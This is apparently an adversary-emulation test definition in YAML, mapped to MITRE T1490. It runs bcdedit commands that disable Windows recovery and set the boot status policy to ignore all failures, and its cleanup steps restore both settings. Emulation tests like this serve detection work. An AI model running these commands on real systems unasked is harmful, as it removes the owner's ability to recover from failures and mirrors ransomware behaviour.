api_version: "2.0"
name: Windows - Disable Windows Recovery Console Repair
description: |
    Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
    Upon execution, "The operation completed successfully." will be displayed in the powershell session.
uuid: cf21060a-80b3-4238-a595-22525de4ab81
mitre:
    tactics:
        - 'TA0040: Impact'
    techniques:
        - 'T1490: Inhibit System Recovery'
requirements:
    platforms:
        - os: windows
steps:
    - name: windows---disable-windows-recovery-console-repair
      inline: |
        bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
        bcdedit.exe /set {default} recoveryenabled no
      executor: command_prompt
      cleanup:
        inline: |
            bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
            bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
        executor: command_prompt
